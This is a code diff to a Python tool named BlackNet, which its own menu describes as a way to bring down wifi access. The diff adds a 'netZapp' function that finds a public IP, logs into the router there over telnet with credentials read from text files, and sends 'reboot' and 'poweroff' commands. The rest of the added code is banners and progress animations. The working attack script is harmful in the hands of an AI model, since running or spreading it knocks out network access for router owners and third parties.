@@ -26,7 +26,22 @@ blackNetBanner = """
  _| |__) | |// | |,| \__.  | |`\ \ _| |_\   |_| \__.,| |,  
 |_______[___]'-;__/'.___.'[__|  \_]_____|\____|'.__.'\__/  
 
-"""        
+"""    
+
+netZappBanner = blue+"""
+
+           , /
+         , '/
+        , '/
+       , '/ _____,
+     .'____, '
+           /, '
+          /, '
+         /, '
+        / '
+
+"""
+
 menuopt = """
   Use BlackNet to bring down wifi acess 
   This tool is not responsible for damage to third parties...
@@ -109,7 +124,7 @@ def blackNetWorks():
 	
 	try:
 		getip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
-		print(green+" Ok!")
+		print(green+"Reading "+getip+" Ok!")
 	except:
 		print(red+" Error!")
 		print(blackNetBanner) 
@@ -183,6 +198,76 @@ def banner():
 
 	print(blackNetBanner) 
 	print(menuopt)
+
+def netZapp():
+
+	print(netZappBanner)
+	print("")
+
+	try:
+		getip = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+		print(green+"Reading "+getip+" Ok!")
+	except:
+		print(tag3+"Error to get public ip.")
+		exit()
+
+	arq1 = open('data/user.txt', 'r')
+	arq2 = open('data/password.txt', 'r')
+	txtUser = arq1.read()
+	txtPassword = arq2.read()
+		
+	HOST = getip
+	user = txtUser
+	password = txtPassword
+
+	try:
+		tn = telnetlib.Telnet(HOST)
+		
+		sys.stdout.write("\r"+tag+HOST+"/User:"+user+"/Pass:"+password+"    <- "+green+"Connecting.")
+		time.sleep(0.5)
+		sys.stdout.write("\r"+tag+HOST+"/User:"+user+"/Pass:"+password+"   <-- "+green+"Connecting..")
+		time.sleep(0.5)
+		sys.stdout.write("\r"+tag+HOST+"/User:"+user+"/Pass:"+password+"  <--- "+green+"Connecting...")
+		time.sleep(0.5)
+		sys.stdout.write("\r"+tag+HOST+"/User:"+user+"/Pass:"+password+" <---- "+green+"Connected ...")
+		time.sleep(0.5)
+		sys.stdout.write("\r"+tag+"###.###.###.###"+"/User:"+user+"/Pass:"+password+" <---- "+green+"Connected ###")
+		time.sleep(0.5)
+		
+		tn.read_until(b"login: ")
+		tn.write(user.encode('ascii') + b"\n")
+		
+		if password:
+			tn.read_until(b"Password: ")
+			tn.write(password.encode('ascii') + b"\n")
+			
+		print("")
+		print(tag+"Rebooting Router...")
+		sys.stdout.write(green+"\r000:"+blue+"______________"+red+"#"+blue+"]")
+		time.sleep(0.5)
+		sys.stdout.write(green+"\r000:"+blue+"_________"+red+"#"+blue+"_____]")
+		time.sleep(0.5)
+		sys.stdout.write(green+"\r000:"+blue+"_____"+red+"#"+blue+"_________]")
+		time.sleep(0.5)
+		sys.stdout.write(green+"\r000:"+red+"#"+blue+"______________]")
+		time.sleep(0.5)
+		sys.stdout.write(green+"\r000:"+blue+"_______________]")
+		time.sleep(0.5)
+		sys.stdout.write(red+"\r###:")
+		time.sleep(0.5)
+		tn.write(b"reboot\n")
+		tn.write(b"poweroff\n")
+		sys.stdout.write("\r"+tag2+"Complete!:~~~~~~")
+		exit()
+		
+	except:
+		print(tag3+"Fatal Error, Connection Refused")
+		exit()
+
+
+
+
+
 	
 
 
